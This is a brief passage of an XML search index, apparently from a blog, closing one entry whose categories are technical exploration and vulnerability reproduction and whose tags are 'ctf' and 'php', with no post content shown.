        <category>技术探索</category>
        <category>漏洞复现</category>
      </categories>
      <tags>
        <tag>ctf</tag>
        <tag>php</tag>
      </tags>
  </entry>
</search>
